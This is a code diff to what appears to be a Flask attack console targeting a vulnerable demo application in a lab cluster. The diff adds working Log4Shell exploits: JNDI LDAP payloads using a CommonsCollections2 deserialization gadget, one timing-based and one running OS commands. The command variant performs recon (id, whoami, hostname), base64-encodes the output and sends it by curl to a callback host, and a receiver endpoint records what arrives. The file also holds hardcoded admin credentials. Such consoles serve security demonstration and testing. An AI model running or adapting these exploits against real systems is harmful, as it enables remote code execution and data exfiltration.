@@ -186,6 +186,19 @@ stop_traffic_flag = False
 traffic_state = "idle"  # idle, starting, running, finished, error
 traffic_output_buffer = []
 
+# Log4Shell: the JNDI-Exploit-Kit LDAP endpoint that serves the deserialization
+# gadget. The CommonsCollections2 gadget supports both a built-in Thread.sleep
+# attack (used by the "sleep" exploit) and arbitrary OS command execution via
+# the exec_unix attack type (used by the "cmd exec" exploit).
+LOG4SHELL_JNDI_BASE = "ldap://exploit-server:1389/serial/CommonsCollections2"
+# In-cluster URL the injected RCE command curls back to so this console can
+# confirm out-of-band that the command actually ran (exec_unix is fire-and-
+# forget, so it produces no timing signal on the HTTP response).
+LOG4SHELL_CALLBACK_URL = "http://console-ui:5000/log4shell/callback"
+# token -> {"time": iso8601, "output": decoded command output}
+log4shell_callbacks = {}
+log4shell_callbacks_lock = threading.Lock()
+
 
 ########################################
 # routes
@@ -527,32 +540,93 @@ def exploit_sql_injection():
     finally:
         exploit_running = False
 
-@app.route('/exploit/log4shell')
-def exploit_log4shell():
+@app.route('/log4shell/callback', methods=['GET', 'POST'])
+def log4shell_callback():
+    """Receiver for the Log4Shell command-execution exploit.
+
+    exec_unix is fire-and-forget, so the injected OS command curls back here
+    with a unique token (and its captured output) to prove out-of-band that it
+    ran. This endpoint only records what it receives; it is the observable
+    signal run_log4shell_cmd_exec_exploit polls for."""
+    token = request.values.get("token", "")
+    out_b64 = request.values.get("out", "")
+    if not token:
+        return jsonify({"status": "error", "message": "token required"}), 400
+
+    try:
+        output = base64.b64decode(out_b64).decode("utf-8", "replace") if out_b64 else ""
+    except Exception:
+        output = ""
+
+    with log4shell_callbacks_lock:
+        log4shell_callbacks[token] = {
+            "time": datetime.datetime.now().isoformat(),
+            "output": output,
+        }
+        # Keep the store bounded.
+        if len(log4shell_callbacks) > 50:
+            oldest = sorted(log4shell_callbacks.items(), key=lambda kv: kv[1]["time"])
+            for k, _ in oldest[:-50]:
+                log4shell_callbacks.pop(k, None)
+
+    return jsonify({"status": "success"}), 200
+
+@app.route('/exploit/log4shell-sleep')
+@app.route('/exploit/log4shell')  # backward-compatible alias
+def exploit_log4shell_sleep():
     global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
-    
+
     if exploit_running:
         return jsonify({"status": "error", "message": "Exploit already running"}), 400
-    
+
     exploit_running = True
-    exploit_state = "log4shell"
-    
+    exploit_state = "log4shell_sleep"
+
     try:
         session = requests.Session()
         # Login first
         login_result = run_login_exploit(session)
         if not login_result:
-            log_exploit_output("Login failed - cannot proceed with Log4Shell exploit", "ERROR")
-            return jsonify({"status": "error", "message": "Login failed - cannot proceed with Log4Shell exploit"}), 500
-        
-        result = run_log4shell_exploit(session)
+            log_exploit_output("Login failed - cannot proceed with Log4Shell Sleep exploit", "ERROR")
+            return jsonify({"status": "error", "message": "Login failed - cannot proceed with Log4Shell Sleep exploit"}), 500
+
+        result = run_log4shell_sleep_exploit(session)
         exploit_state = "finished"
-        log_exploit_output(f"Log4Shell exploit completed - Success: {result}")
-        return jsonify({"status": "success", "message": "Log4Shell exploit completed", "result": result}), 200
+        log_exploit_output(f"Log4Shell Sleep exploit completed - Success: {result}")
+        return jsonify({"status": "success", "message": "Log4Shell Sleep exploit completed", "result": result}), 200
     except Exception as e:
         exploit_state = "error"
-        log_exploit_output(f"Log4Shell exploit failed: {str(e)}", "ERROR")
-        return jsonify({"status": "error", "message": f"Log4Shell exploit failed: {str(e)}"}), 500
+        log_exploit_output(f"Log4Shell Sleep exploit failed: {str(e)}", "ERROR")
+        return jsonify({"status": "error", "message": f"Log4Shell Sleep exploit failed: {str(e)}"}), 500
+    finally:
+        exploit_running = False
+
+@app.route('/exploit/log4shell-cmd-exec')
+def exploit_log4shell_cmd_exec():
+    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
+
+    if exploit_running:
+        return jsonify({"status": "error", "message": "Exploit already running"}), 400
+
+    exploit_running = True
+    exploit_state = "log4shell_cmd_exec"
+
+    try:
+        session = requests.Session()
+        # Login first
+        login_result = run_login_exploit(session)
+        if not login_result:
+            log_exploit_output("Login failed - cannot proceed with Log4Shell Cmd Exec exploit", "ERROR")
+            return jsonify({"status": "error", "message": "Login failed - cannot proceed with Log4Shell Cmd Exec exploit"}), 500
+
+        result = run_log4shell_cmd_exec_exploit(session)
+        exploit_state = "finished"
+        log_exploit_output(f"Log4Shell Cmd Exec exploit completed - Success: {result}")
+        return jsonify({"status": "success", "message": "Log4Shell Cmd Exec exploit completed", "result": result}), 200
+    except Exception as e:
+        exploit_state = "error"
+        log_exploit_output(f"Log4Shell Cmd Exec exploit failed: {str(e)}", "ERROR")
+        return jsonify({"status": "error", "message": f"Log4Shell Cmd Exec exploit failed: {str(e)}"}), 500
     finally:
         exploit_running = False
 
@@ -681,7 +755,8 @@ def exploit_list():
         {"name": "Command Injection", "endpoint": "/exploit/command-injection", "description": "OS command injection exploit including reverse shell preparation"},
         {"name": "Path Traversal", "endpoint": "/exploit/path-traversal", "description": "Directory traversal exploit"},
         {"name": "SQL Injection", "endpoint": "/exploit/sql-injection", "description": "SQL injection exploit"},
-        {"name": "Log4Shell", "endpoint": "/exploit/log4shell", "description": "Log4j JNDI injection exploit"},
+        {"name": "Log4Shell Sleep", "endpoint": "/exploit/log4shell-sleep", "description": "Log4j JNDI injection using the deserialization gadget's Thread.sleep, verified by the induced response delay"},
+        {"name": "Log4Shell Cmd Exec", "endpoint": "/exploit/log4shell-cmd-exec", "description": "Log4j JNDI injection achieving OS command execution via exec_unix, verified by an out-of-band callback carrying the command output"},
         {"name": "SSJS Injection", "endpoint": "/exploit/ssjs-injection", "description": "Server-side JavaScript injection"},
         {"name": "XXE", "endpoint": "/exploit/xxe", "description": "XML External Entity injection"},
         {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"},
@@ -1406,28 +1481,139 @@ def run_sql_injection_exploit(session):
         log_exploit_output("WARNING: SQL injection may not have worked (response time too fast)")
         return False
 
-def run_log4shell_exploit(session):
-    """Execute Log4Shell (Log4j) exploit"""
-    log_exploit_output("Executing Log4Shell (Log4j) exploit")
-    
-    # JNDI LDAP payload targeting exploit-server
-    log4shell_payload = {
-        "username": "${jndi:ldap://exploit-server:1389/serial/CommonsCollections2/sleep/1000}",
-        "password": "dgsdfdfsg"
+def _log4shell_clean_b64(cmd):
+    """Base64-encode a shell command for the exec_unix JNDI path, guaranteeing
+    the output contains no '+' or '/'.
+
+    The username field is form-decoded before log4j resolves the JNDI lookup,
+    which turns '+' into a space, and the exploit kit's decoder then rejects
+    the payload ('Illegal base64 character 20'). We prepend a ': <n>;' shell
+    no-op and bump the counter until the encoding avoids both characters."""
+    n = 0
+    while True:
+        variant = f": {n}; {cmd}"
+        enc = base64.b64encode(variant.encode()).decode()
+        if '+' not in enc and '/' not in enc:
+            return enc
+        n += 1
+
+
+def run_log4shell_sleep_exploit(session):
+    """Execute Log4Shell via the CommonsCollections2 gadget's built-in
+    Thread.sleep attack.
+
+    Verification is time-based (blind), but a single delayed request is not
+    proof on its own: if the LDAP server were unreachable, the JNDI lookup
+    would hang on connection and mimic a sleep. So we fire two payloads with
+    different sleep durations and require the response time to SCALE with the
+    injected value - a fixed connection hang would not. That scaling is what
+    proves our gadget's Thread.sleep actually executed."""
+    log_exploit_output("Executing Log4Shell (Sleep) exploit")
+
+    SHORT_MS, LONG_MS = 1000, 4000
+    short_s, long_s = SHORT_MS / 1000.0, LONG_MS / 1000.0
+
+    def timed_login(username, label):
+        t0 = time.time()
+        r = session.post("http://cargocats.localhost/login",
+                         data={"username": username, "password": "dgsdfdfsg"},
+                         timeout=60, allow_redirects=True)
+        dt = time.time() - t0
+        log_exploit_output(f"{label}: HTTP {r.status_code}, {dt:.2f}s")
+        return dt
+
+    short_payload = f"${{jndi:{LOG4SHELL_JNDI_BASE}/sleep/{SHORT_MS}}}"
+    long_payload = f"${{jndi:{LOG4SHELL_JNDI_BASE}/sleep/{LONG_MS}}}"
+    log_exploit_output(f"JNDI payload A (username): {short_payload}")
+    log_exploit_output(f"JNDI payload B (username): {long_payload}")
+
+    t_short = timed_login(short_payload, f"Sleep {short_s:.0f}s payload")
+    t_long = timed_login(long_payload, f"Sleep {long_s:.0f}s payload")
+
+    scaling = t_long - t_short
+    expected = long_s - short_s
+    # The username is logged on each attempt so the sleep may fire more than
+    # once, only inflating the gap; 0.6x of the expected difference is a safe
+    # floor that a fixed connection hang (which does not scale) will not clear.
+    success = scaling >= expected * 0.6
+    if success:
+        log_exploit_output(f"SUCCESS: response time scaled with injected sleep (+{scaling:.2f}s for +{expected:.0f}s) - JNDI sleep gadget executed")
+    else:
+        log_exploit_output(f"WARNING: response time did not scale with sleep value (+{scaling:.2f}s) - gadget may not have executed (or LDAP unreachable)", "WARNING")
+
+    # Re-authenticate so the shared session stays valid for any later exploits.
+    session.post("http://cargocats.localhost/login",
+                 data={"username": "admin", "password": "password123"},
+                 timeout=10, allow_redirects=True)
+
+    return success
+
+
+def run_log4shell_cmd_exec_exploit(session):
+    """Execute Log4Shell to achieve real OS command execution via the exploit
+    kit's exec_unix attack type.
+
+    exec_unix is fire-and-forget (Runtime.exec does not wait), so there is no
+    timing signal on the HTTP response. Instead the injected command runs recon
+    (id/whoami/hostname) and curls the captured output back to this console with
+    a unique token. Verification = that callback arriving with matching output."""
+    log_exploit_output("Executing Log4Shell (Command Execution) exploit")
+
+    # Unique per-run token so we only match our own callback. Derived from the
+    # clock to avoid pulling in extra imports; uniqueness across runs is enough.
+    token = "rce-" + str(int(time.time() * 1000))
+
+    # A real attacker's recon, plus an out-of-band exfil so the console can
+    # observe execution. Output is base64'd on the target and POSTed back.
+    #
+    # IMPORTANT: the exploit kit's exec_unix attack compiles the command into
+    # generated Java source (javassist), embedding it in a Java string literal
+    # that is then run via a shell. Shell metacharacters (; | $() {} > 2>&1)
+    # are fine, but a double-quote or backslash terminates the Java literal and
+    # fails compilation. So this command uses NO double quotes and NO
+    # backslashes: `base64 -w0` replaces `tr -d "\n"`, and curl args are left
+    # unquoted (token is alphanumeric, $OUT is single-word base64).
+    recon = "id; whoami; hostname"
+    shell_cmd = (
+        f"OUT=$({{ {recon}; }} 2>&1 | base64 -w0); "
+        f"curl -s -X POST "
+        f"--data-urlencode token={token} "
+        f"--data-urlencode out=$OUT "
+        f"{LOG4SHELL_CALLBACK_URL}"
+    )
+    b64 = _log4shell_clean_b64(shell_cmd)
+
+    payload = {
+        "username": f"${{jndi:{LOG4SHELL_JNDI_BASE}/exec_unix/{b64}}}",
+        "password": "dgsdfdfsg",
     }
-    
-    r = session.post("http://cargocats.localhost/login", 
-                    data=log4shell_payload, 
-                    timeout=15)
-    log_exploit_output(f"Log4Shell exploit response status: {r.status_code}")
-    
-    # Re-authenticate after Log4Shell exploit
-    log_exploit_output("Re-authenticating after Log4Shell exploit")
-    creds = {"username": "admin","password": "password123"}
-    r = session.post("http://cargocats.localhost/login", data=creds, timeout=10, allow_redirects=True)
-    log_exploit_output(f"Re-login response status: {r.status_code}")
-    
-    return r.status_code == 200
+    log_exploit_output(f"Injecting via JNDI exec_unix, remote command: {recon}")
+
+    session.post("http://cargocats.localhost/login",
+                 data=payload, timeout=60, allow_redirects=True)
+
+    # Poll for the callback the injected command makes back to this console.
+    success = False
+    for _ in range(30):  # up to ~15s
+        with log4shell_callbacks_lock:
+            hit = log4shell_callbacks.pop(token, None)
+        if hit is not None:
+            success = True
+            log_exploit_output("SUCCESS: remote command executed, output returned via callback:")
+            for line in (hit.get("output") or "").splitlines():
+                log_exploit_output(f"  {line}")
+            break
+        sleep(0.5)
+
+    if not success:
+        log_exploit_output("WARNING: no RCE callback received - command execution not confirmed", "WARNING")
+
+    # Re-authenticate so the shared session stays valid for any later exploits.
+    session.post("http://cargocats.localhost/login",
+                 data={"username": "admin", "password": "password123"},
+                 timeout=10, allow_redirects=True)
+
+    return success
 
 def run_ssjs_injection_exploit(session):
     """Execute SSJS injection exploit"""
@@ -1633,12 +1819,20 @@ def exploit():
         run_sql_injection_exploit(session)
 
         # ================================================
-        # LOG4SHELL EXPLOIT
+        # LOG4SHELL SLEEP EXPLOIT
         # ================================================
-        exploit_state = "log4shell"
-        if check_exploit_stop("Log4Shell"):
+        exploit_state = "log4shell_sleep"
+        if check_exploit_stop("Log4Shell Sleep"):
             return
-        run_log4shell_exploit(session)
+        run_log4shell_sleep_exploit(session)
+
+        # ================================================
+        # LOG4SHELL COMMAND EXECUTION EXPLOIT
+        # ================================================
+        exploit_state = "log4shell_cmd_exec"
+        if check_exploit_stop("Log4Shell Cmd Exec"):
+            return
+        run_log4shell_cmd_exec_exploit(session)
 
         # ================================================
         # ADDITIONAL LOGIN AFTER LOG4SHELL
@@ -1646,8 +1840,8 @@ def exploit():
         exploit_state = "post_log4shell_login"
         if check_exploit_stop("post-Log4Shell login"):
             return
-        
-        log_exploit_output("Additional login verification after Log4Shell exploit")
+
+        log_exploit_output("Additional login verification after Log4Shell exploits")
         creds = {"username": "admin","password": "password123"}
         r = session.post("http://cargocats.localhost/login", data=creds, timeout=10, allow_redirects=True)
         log_exploit_output(f"Post-Log4Shell login response status: {r.status_code}")
